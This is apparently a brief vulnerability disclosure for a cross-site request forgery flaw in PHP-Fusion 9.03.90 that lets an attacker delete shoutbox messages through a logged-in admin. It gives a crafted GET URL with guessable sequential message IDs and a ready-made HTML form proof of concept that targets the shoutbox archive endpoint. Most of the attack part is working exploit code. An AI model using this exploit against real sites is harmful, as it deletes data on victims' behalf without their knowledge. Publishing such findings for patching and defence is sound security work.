1. Description:
PHP-Fusion version 9.03.90 is vulnerable to CSRF attack which leads to deletion of shoutbox messages by the attacker on behalf of the logged in victim.

2. Proof of Concept
As the requests for deleting the admin shoutbox are sent using the GET method, the CSRF attack to delete an attacker-controlled shoutbox message can be performed by having the admin visit https://TARGET.com/infusions/shoutbox_panel/shoutbox_archive.php?s_action=delete&shout_id=1 directly,
after getting to know the shout_id of the message, as it is sequential.

<body>
<script>history.pushState('', '', '/')</script>
<form action="https://TARGET/infusions/shoutbox_panel/shoutbox_archive.php">
<input type="hidden" name="s&#95;action" value="delete" />
<input type="hidden" name="shout&#95;id" value="3" />
<input type="submit" value="Submit request" />
</form>
